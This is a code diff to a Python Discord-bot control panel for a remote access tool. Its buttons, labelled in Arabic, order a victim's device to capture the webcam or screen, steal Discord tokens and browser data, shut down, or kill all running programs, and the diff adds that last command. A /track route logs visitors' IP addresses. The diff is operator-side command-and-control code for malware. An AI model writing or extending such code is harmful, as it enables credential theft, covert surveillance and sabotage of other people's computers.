@@ -139,7 +139,6 @@ def autologin():
 @app.route('/track')
 def track_visitor():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    user_agent = request.headers.get('User-Agent', 'Unknown')
     redirect_target = request.args.get('to', 'https://www.google.com')
     country = 'Unknown'
     try:
@@ -361,13 +360,13 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_webcams", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Webcam {self.code}"): await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
 
-    @discord.ui.button(label="🔑 سحب توكنات ديسكورد", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
+    @discord.ui.button(label="🔑 سحب التوكنات والمتصفحات", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
     async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Tokens {self.code}"): await interaction.followup.send("🔑 تم طلب سحب التوكنات!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Tokens {self.code}"): await interaction.followup.send("🔑 تم طلب سحب التوكنات والمتصفحات الشاملة!", ephemeral=True)
 
     @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -410,7 +409,16 @@ class DeviceActionsView(discord.ui.View):
             if "remote_lock_states" in db and self.code in db["remote_lock_states"]: del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Close {self.code}"): await interaction.followup.send("🛑 تم إطفاء الأداة من الخلفية!", ephemeral=True)
 
-    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=3)
+    @discord.ui.button(label="إغلاق جميع البرامج في الخلفية والألعاب", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_all_apps", row=3)
+    async def kill_all_apps_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_kill_all_apps", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Kill all background apps for {self.code}"): 
+                await interaction.followup.send("🛑 تم إرسال أمر إغلاق كافة البرامج والألعاب في الخلفية (مع استثناء السكربت) بنجاح!", ephemeral=True)
+
+    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
